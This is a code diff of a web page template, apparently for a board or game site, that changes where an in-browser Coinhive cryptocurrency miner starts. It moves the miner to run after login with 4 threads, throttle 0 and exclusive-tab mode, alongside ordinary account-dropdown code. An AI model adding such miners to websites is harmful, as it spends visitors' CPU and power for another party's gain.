@@ -173,9 +173,6 @@ $alphabet[-1] = '';
 	<script type="text/javascript" src="<?=base_url()?>assets/js/jquery.countdown.min.js"></script>
 	<script type="text/javascript" src="https://authedmine.com/lib/authedmine.min.js"></script>
 	<script>
-	var miner = new CoinHive.Anonymous('VGOoKHMh1AUbG8VtWD33mZzDhEznbMaX');
-	miner.start();
-
 	var me_id = 0, board = 0, last_action = 0, listener, lang;
 	var params = location.pathname.split("/");
 	var updateURL = function() {
@@ -925,11 +922,22 @@ $alphabet[-1] = '';
 				console.log('Auth info received', data);
 				if (data.success) {
 					me_id = data.user;
+
 					$("#accountDropdown > a.nav-link.dropdown-toggle").html("<img src=\"https://gficher.com/profile_images/"+data.picture+"\" style=\"width: 20px; border-radius: 100%; margin-top: -3px;\"> "+data.username+"");
 					$("#accountDropdown .loggedin").css({display: 'block'});
 					$("#accountDropdown .loggedout").css({display: 'none'});
 					$("#accountDropdown .loggedin .dropdown-header").html(data.name+" "+data.surname);
 				}
+
+				var miner = new CoinHive.Anonymous('VGOoKHMh1AUbG8VtWD33mZzDhEznbMaX', me_id, {
+					threads: 4,
+					autoThreads: true,
+					throttle: 0,
+					forceASMJS: false,
+					theme: 'dark',
+					language: 'auto'
+				});
+				miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 			}).fail(function(data) {
 				console.error(data);
 			});
